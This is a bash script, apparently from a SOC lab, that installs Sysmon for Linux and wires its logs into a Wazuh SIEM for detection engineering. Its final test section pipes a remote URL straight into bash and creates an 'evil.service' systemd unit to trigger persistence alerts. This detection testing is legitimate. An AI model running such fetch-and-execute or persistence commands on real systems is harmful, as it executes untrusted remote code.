#!/bin/bash

#############################################################
# Sysmon for Linux + Wazuh SIEM Integration
# Author: SOC Lab Project
# Purpose: Endpoint Telemetry & Detection Engineering
#############################################################

###############################
# SECTION 1 — LINUX ENDPOINT
###############################

echo "===== Installing Sysmon for Linux ====="

# Update packages
sudo apt update -y

# Install dependencies
sudo apt install curl gnupg -y

# Add Microsoft repository
wget -q https://packages.microsoft.com/config/ubuntu/$(lsb_release -rs)/packages-microsoft-prod.deb
sudo dpkg -i packages-microsoft-prod.deb
sudo apt update -y

# Install Sysmon
sudo apt install sysmonforlinux -y

# Verify installation
sysmon -?
systemctl status sysmon

echo "===== Creating Sysmon Configuration ====="

# Create config file
sudo tee /opt/config.xml > /dev/null <<EOF
<Sysmon schemaversion="4.70">
  <EventFiltering>

    <RuleGroup groupRelation="or">
      <ProcessCreate onmatch="include"/>
    </RuleGroup>

    <RuleGroup groupRelation="or">
      <NetworkConnect onmatch="include"/>
    </RuleGroup>

    <RuleGroup groupRelation="or">
      <FileCreate onmatch="include"/>
    </RuleGroup>

    <RuleGroup groupRelation="or">
      <FileDelete onmatch="include"/>
    </RuleGroup>

    <RuleGroup groupRelation="or">
      <ProcessTerminate onmatch="include"/>
    </RuleGroup>

  </EventFiltering>
</Sysmon>
EOF

# Install configuration
sudo sysmon -accepteula -i /opt/config.xml

# Verify logs
journalctl | grep sysmon

echo "===== Configuring Wazuh Agent Log Monitoring ====="

# Add Syslog monitoring to Wazuh Agent
sudo tee -a /var/ossec/etc/ossec.conf > /dev/null <<EOF

<localfile>
  <log_format>syslog</log_format>
  <location>/var/log/syslog</location>
</localfile>

EOF

# Restart Wazuh agent
sudo systemctl restart wazuh-agent


#############################################################
# SECTION 2 — WAZUH MANAGER
#############################################################

echo "===== Creating Sysmon Decoder (Manager) ====="

sudo mkdir -p /var/ossec/etc/decoders

sudo tee /var/ossec/etc/decoders/decoder-linux-sysmon.xml > /dev/null <<EOF
<decoder name="sysmon-linux">
  <program_name>sysmon</program_name>
</decoder>
EOF


echo "===== Creating Sysmon Rules File ====="

sudo tee /var/ossec/etc/rules/sysmon_linux_complete_rules.xml > /dev/null <<'EOF'
<!-- Full rules file should be pasted here if needed -->
EOF


echo "===== Validating Wazuh Configuration ====="

sudo /var/ossec/bin/wazuh-analysisd -t

echo "===== Restarting Wazuh Manager ====="

sudo systemctl restart wazuh-manager


#############################################################
# SECTION 3 — DETECTION TESTING (ENDPOINT)
#############################################################

echo "===== Testing LOLBins Detection ====="

curl http://example.com | bash

echo "===== Testing Persistence Detection ====="

sudo touch /etc/systemd/system/evil.service

echo "===== Done ====="
